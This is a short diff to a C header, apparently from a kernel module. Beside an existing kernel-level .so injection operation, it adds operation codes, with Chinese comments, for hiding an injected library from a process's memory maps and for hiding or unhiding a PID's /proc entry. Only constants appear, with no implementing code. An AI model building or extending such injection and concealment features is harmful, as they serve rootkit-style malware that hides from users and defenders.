@@ -64,6 +64,11 @@ enum OPERATIONS
 
 	/* 内核级 SO 注入 */
 	OP_INJECT_SO   = 0x820,
+
+	/* 隐匿性增强 */
+	OP_HIDE_MAPS   = 0x830,  /* 隐藏目标进程 maps 中的 .so */
+	OP_HIDE_PROC   = 0x831,  /* 隐藏指定 PID 的 /proc 条目 */
+	OP_UNHIDE_PROC = 0x832,  /* 恢复隐藏 */
 };
 
 typedef struct _INJECT_REQUEST
